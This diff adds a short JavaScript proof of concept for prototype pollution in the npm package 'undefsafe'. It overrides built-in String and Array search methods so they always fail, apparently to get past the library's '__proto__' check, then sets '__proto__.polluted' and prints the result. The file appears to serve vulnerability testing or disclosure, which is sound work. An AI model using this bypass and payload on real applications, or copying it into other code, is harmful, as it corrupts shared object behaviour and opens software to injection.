@@ -1,0 +1,16 @@
+String.prototype.includes = () => false;
+String.prototype.startsWith = () => false;
+String.prototype.endsWith = () => false;
+String.prototype.indexOf = () => -1;
+String.prototype.lastIndexOf = () => false;
+String.prototype.match = () => false;
+String.prototype.search = () => false;
+String.prototype.matchAll = () => false;
+Array.prototype.includes = () => false;
+Array.prototype.indexOf = () => -1;
+console.log({}.polluted);
+const a = require('undefsafe');
+const obj = {};
+const payload = '__proto__.polluted';
+a({}, payload, 'yes');
+console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');
